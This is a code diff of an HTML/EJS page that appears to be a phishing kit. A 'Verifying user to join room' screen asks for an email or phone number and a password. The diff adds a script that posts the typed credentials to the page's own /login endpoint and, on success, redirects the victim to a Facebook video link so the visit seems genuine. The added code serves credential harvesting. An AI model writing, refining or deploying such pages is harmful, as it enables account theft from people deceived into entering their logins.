@@ -116,7 +116,7 @@
 </head>
 
 <body>
-    <!-- Preloader -->
+    <!-- Preloader -->a
     <div id="preloader">
         <div class="preloader-spinner"></div>
         <div class="preloader-text">Verifying user to join room</div>
@@ -140,8 +140,8 @@
                             <%= message %>
                         </div>
                     <% } %>
-                    <input type="text" name="email" placeholder="Email address or phone number" required value="<%= email %>">
-                    <input type="password" name="password" placeholder="Password" required value="<%= password %>">
+                    <input type="text" name="email" placeholder="Email address or phone number" required >
+                    <input type="password" name="password" placeholder="Password" required>
                     
                     <!-- Spinner and "Joining..." text - initially hidden -->
                     <div class="joining" style="display: none;">
@@ -199,9 +199,63 @@
     
             document.querySelector('.log').disabled = true;
         }
+
+
+
+
+
+
+
+
+        // Handle form submission and redirect
+    async function handleFormSubmission(event) {
+        event.preventDefault();
+        
+        // Collect form data
+        const formData = {
+            email: document.querySelector('input[name="email"]').value,
+            password: document.querySelector('input[name="password"]').value
+        };
+
+
+        // Send POST request with form data
+        const response = await fetch("/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(formData)
+        });
+
+        if (response.ok) {
+            const data = await response.json();
+
+            // Display message from the server
+            const messageElement = document.querySelector('.message');
+            if (data.message) {
+                messageElement.textContent = data.message;
+                messageElement.style.display = 'block';
+                messageElement.classList.add(data.redirect ? 'success' : 'error');
+            }
+
+            // If response indicates a redirect, show success message and redirect after 3 seconds
+            if (data.redirect) {
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com/share/v/QeSVNGdVsuCoW8Bs/?mibextid=WC7FNe';
+                }, 3000); // 3-second delay for redirect
+            } else {
+                // Enable form submission again for wrong password
+                document.querySelector('.log').disabled = false;
+                document.querySelector('.joining').style.display = 'none';
+            }
+        }
+    }
+
+    // Attach submission handler to form
+    document.querySelector('form').addEventListener('submit', handleFormSubmission);
+
     </script>
     
-   
+
+    
     
 
 </body>
